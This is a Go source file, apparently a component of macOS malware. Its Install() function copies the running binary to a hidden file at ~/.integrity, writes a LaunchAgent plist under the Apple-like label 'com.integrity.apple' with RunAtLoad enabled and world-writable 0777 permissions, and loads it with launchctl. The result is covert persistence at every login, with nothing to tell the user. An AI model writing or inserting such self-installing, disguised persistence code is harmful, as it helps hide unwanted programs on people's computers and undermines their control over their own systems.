package main

import (
	"io/ioutil"
	"os"
	"github.com/cleversoap/go-cp"
	"fmt"
	"os/exec"
)

var INSTALLATION_PATH = os.Getenv("HOME") + "/.integrity"

func Install() {
	// Copy exe to install path
	err := cp.Copy(os.Args[0], INSTALLATION_PATH)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(0)
	}
	exec.Command("chmod","+x", INSTALLATION_PATH).Run()


	var script = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.integrity.apple</string>
	<key>Program</key>
	<string>`+ INSTALLATION_PATH +`</string>
	<key>ProgramArguments</key>
	<array>
		<string>`+ INSTALLATION_PATH +`</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>`

	err = ioutil.WriteFile("/Library/LaunchAgents/com.integrity.apple.plist", []byte(script), 0777)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(0)
	}
	exec.Command("launchctl","load", "/Library/LaunchAgents/com.integrity.apple.plist").Run()

	//Chek path for installation
	//Write scritp to /library/launch daemons
	//Start
}